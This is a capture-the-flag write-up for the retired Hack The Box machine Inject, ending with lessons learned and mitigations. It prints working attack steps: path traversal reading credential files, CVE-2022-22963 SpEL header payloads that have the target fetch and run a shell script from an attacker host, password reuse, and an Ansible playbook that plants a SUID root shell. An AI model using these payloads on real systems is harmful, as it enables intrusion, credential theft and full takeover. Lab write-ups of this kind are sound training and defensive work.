---
machine: Inject
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, spring, tomcat, file-read, directory-traversal, cve-2022-22963, spel, ansible, privesc]
---

# Inject — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Tomcat serves a Spring application on `8080`. The image viewer accepts a path in `img` and allows traversal, which reads `/etc/passwd`, `frank`'s Maven `settings.xml` and the project's `pom.xml`. The `pom.xml` declares `spring-cloud-function-web` 3.2.2, vulnerable to CVE-2022-22963: a SpEL expression in the `spring.cloud.function.routing-expression` header is evaluated when `/functionRouter` is called, giving execution as `frank`. The Maven password works to switch to `phil` with `su`. `phil` can write to `/opt/automation/tasks`, which a root cron processes with `ansible-parallel`; a custom playbook creates a SUID bash and yields root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `8080`: Tomcat with the Spring application.

```bash
echo '<IP> inject.htb' | sudo tee -a /etc/hosts
feroxbuster -u http://inject.htb:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

## Enumeration

The main page allows image uploads and returns links such as `/show_image?img=<file>`. The parameter does not validate the path:

```bash
curl 'http://inject.htb:8080/show_image?img=../../../../etc/passwd'
curl 'http://inject.htb:8080/show_image?img=../../../../home/frank/.m2/settings.xml'
curl 'http://inject.htb:8080/show_image?img=../../../../var/www/WebApp/pom.xml'
```

The `settings.xml` contains Maven credentials for `phil`, but they do not work over SSH. The `pom.xml` reveals the stack and version:

```text
spring-cloud-function-web 3.2.2
```

That version predates 3.2.3 and is vulnerable to CVE-2022-22963 (SpEL injection in Spring Cloud Function). Running Snyk against the `pom.xml` confirms the dependency.

## Foothold

The affected endpoint is `/functionRouter`. The expression is sent in a header and evaluated before the function is routed:

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://<LHOST>/shell.sh -o /tmp/shell.sh")
Content-Type: application/x-www-form-urlencoded

test
```

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")
Content-Type: application/x-www-form-urlencoded

test
```

Execution is as `frank`. If the payload contains a pipe, Java treats it as part of the command; bash brace expansion avoids the problem:

```text
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,<BASE64>}|{base64,-d}|bash")
```

## Lateral movement

The Maven password from `settings.xml` is valid for `phil`:

```bash
su phil
# password from settings.xml
```

`phil` can read `user.txt` and write to the automation directory.

## Privilege escalation

`/opt/automation/tasks` holds playbooks and a root cron runs:

```text
/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

Dropping a custom YAML in that directory is enough:

```yaml
- hosts: localhost
  tasks:
    - name: shell
      shell: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

On the next run, `/tmp/rootbash` appears with the root SUID bit:

```bash
/tmp/rootbash -p
id
```

## Evidence

- `show_image` reading files outside the web directory.
- `pom.xml` with `spring-cloud-function-web` 3.2.2.
- Request to `/functionRouter` with the SpEL header and a shell as `frank`.
- `settings.xml` with `phil`'s password and a successful `su`.
- Playbook in `/opt/automation/tasks` and a root-owned SUID bash.

## Lessons learned

- A parameter that takes paths must be resolved against a base directory and validated.
- Java dependencies must be reviewed by version, not just by the main framework.
- A Maven repository credential can be reused against the operating system.
- A writable automation directory executed by root is direct code execution.
- Ansible playbooks run with the privileges of the process that launches them.

## Mitigations and detection

- Update Spring Cloud Function to a fixed version and block `/functionRouter` without authentication.
- Validate paths with `realpath` and a directory allowlist.
- Separate build credentials from system accounts; rotate them and never reuse them.
- Restrict writes to `/opt/automation/tasks` and sign or validate playbooks.
- Monitor `ansible-playbook`/`ansible-parallel` processes and SUID binary creation.
- Alert on requests carrying the `spring.cloud.function.routing-expression` header.

## References

- [0xdf — Inject](https://0xdf.gitlab.io/2023/07/08/htb-inject.html)
- [Hack The Box — Inject](https://app.hackthebox.com/machines/inject)
- [NVD — CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
